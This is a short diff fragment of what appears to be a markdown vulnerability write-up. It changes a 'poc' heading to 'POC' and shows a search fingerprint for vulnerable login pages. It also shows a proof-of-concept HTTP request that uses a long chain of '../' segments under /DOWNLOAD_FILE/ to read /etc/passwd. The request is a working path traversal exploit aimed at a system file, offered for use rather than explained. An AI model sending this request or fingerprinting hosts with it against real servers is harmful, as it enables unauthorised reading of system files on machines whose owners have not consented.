@@ -8,7 +8,7 @@
 body="/assets/css/ui-dialog.css"&& body="/form/formUserLogin"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
